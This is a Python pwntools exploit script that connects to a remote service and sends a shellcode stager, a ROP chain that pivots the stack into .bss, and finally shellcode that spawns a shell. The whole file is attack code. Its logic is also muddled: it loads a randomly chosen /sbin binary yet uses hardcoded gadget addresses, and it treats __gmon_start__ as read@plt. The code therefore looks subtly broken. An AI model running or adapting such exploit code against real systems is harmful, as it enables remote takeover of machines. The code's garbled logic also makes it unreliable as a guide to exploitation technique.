from pwn import *

local = False

lists = list()
for i in os.listdir("/sbin"):
    if os.path.islink("/sbin/" + i):
        pass
    else:
        lists.append(i)
shuffle(lists)


def sigalarm_handler(num, stack):
    log.warn("Timeout!Continue it!")


signal.signal(signal.SIGALRM, sigalarm_handler)
binary = ELF("/sbin/"+lists[0])
context.arch = 'amd64'
def method15(ip,port):
    p = remote(ip, port)

    # Custom shellcode using allowed seccomp sandbox syscalls to communicate with the child process

    shellcode = asm('''
        pop rsi
        xor rdx, rdx
        mov  dl, 255
        xor rdi, rdi
        mov dil, 0x06
        mov  al, 0x01
        syscall
    ''')

    shellcode += '\xe8' + p32(0x100000000 - (len(shellcode) + 5)) # auto adjust shellcode jump

    stager  = ''
    stager += '\xeb' + chr(len(shellcode) - 5)
    stager += shellcode
    stager += '\x0a'
    stager += p32(0x200) * (116//4)
    stager += p64(binary.bss()) # bss

    rop_chain = [
        p64(0x400eb3),                # pop rdi; ret;
        p64(0x0),                     # stdin
        p64(0x400eb1),                # pop rsi; pop r15; ret;
        p64(binary.bss() + 8),        #
        p64(0x0),                     #
        p64(binary.symbols['__gmon_start__']),  # read @ plt
        p64(0x400aee)                 # leave; ret;
    ]

    stager += bytearray(''.join(rop_chain))

    p.send(chr(len(stager)))

    p.send(stager)

    stack_pivot  = p64(binary.bss() + 0x10)
    stack_pivot += asm(shellcraft.linux.sh())

    p.send(stack_pivot)


if __name__=="__main__":
    method15("127.0.0.1",80)